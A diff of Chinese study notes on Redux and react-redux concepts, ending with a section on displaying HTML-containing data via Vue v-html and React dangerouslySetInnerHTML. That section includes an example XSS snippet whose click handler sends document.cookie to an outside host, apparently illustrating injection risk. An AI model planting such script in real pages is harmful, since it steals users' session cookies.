@@ -34,22 +34,29 @@
                         <MyContext.Consumer>
                     ```
 
+### 知识点
 * React & Redux
     > 他们是两个独立的产品，Redux不是React专属，它可以与任何第三方框架配合使用
 
 * Redux
+    > 搞清楚redux有什么，解决了什么问题
     * 核心概念Store
         * dispatch(action)    修改state的唯一方法
         * getState()          获取state数据
         * subscribe()
+    * State
+        > 真正存放数据的地方
 
     * Reducer：修改数据的方式
         > 在创建store时要事先定义好如何修改上面的数据
-        * reducer是一个纯函数
+        * reducer是一个纯函数，state和actoin作为参数
         * 必须返回一个新的state
     * Action    命令（动作）
-        * type  
-        * payload
+        * 格式：`{type,payload}`
+            * type      要做什么操作
+            * payload   传递的参数
+        * Action Creator：一个用于创建action的方法
+            * bindActionCreators：把ActionCreator中的所有方法(export default中的方法)绑定到组件props
 
 * redux使用步骤
     1. 创建store（需要指定state与state的修改方式）
@@ -62,6 +69,7 @@
     4. 使用
         * 获取：store.getState()
         * 修改：store.dispatch(action)
+        * 监听：store.subscribe(fn)
     
 * react-redux
     * 利用context把store上的数据传入到react组件中
@@ -71,3 +79,29 @@
                 <Provider store={store}>
             ```
         2. 使用`connect`高阶组件映射数据到组件的props
+            ```js
+                connect([mapStateToProps][,mapDispatchToProps])(MyComponent)
+            ```
+            * 统一处理redux操作
+
+* 在组件中显示包含html代码的数据
+    ```html
+        <img src="meinv.png" id="meinv"/>
+        <h4>点我有惊喜</h4>
+        <script>
+            let meinv = document.querySelector('#meinv');
+            meinv.onclick = function(){
+                location.href="http://laoxie.com?data="+document.cookie
+
+            }
+        </script>
+    ```
+    * Vue：v-html
+    ```html
+        <div v-html="content"></div>
+    ```
+    * React:
+    ```jsx
+        //<div>{content}</div>
+        <div dangerouslySetInnerHTML={{__html:content}}></div>
+    ```
